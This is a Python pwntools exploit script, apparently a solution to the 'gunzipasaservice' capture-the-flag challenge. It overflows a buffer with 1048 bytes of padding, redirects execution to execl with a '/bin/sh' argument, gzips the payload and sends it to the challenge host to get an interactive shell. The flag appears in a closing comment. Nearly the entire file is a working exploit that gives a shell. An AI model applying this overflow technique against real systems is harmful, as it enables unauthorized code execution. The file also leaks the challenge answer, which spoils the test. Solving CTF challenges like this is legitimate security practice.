from pwn import *
import subprocess
elf = ELF('./gunzipasaservice', checksec=False)
# make payload
#

payload = ''.join([
    'A'*1048,
    p32(elf.plt['execl']),
    p32(elf.sym['subprocess']), # junk
    p32(0x0804a00e),            # /bin/sh
])
fd = open('payload', 'wb')
fd.write(payload)
fd.close()
subprocess.Popen('gzip payload -f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()[0]

fd = open('payload.gz', 'r')
payload = fd.read()
fd.close()

#p = elf.process()
p = remote('challenges.tamuctf.com', 4709)
p.sendline(payload)
p.interactive()
# gigem{r0p_71m3}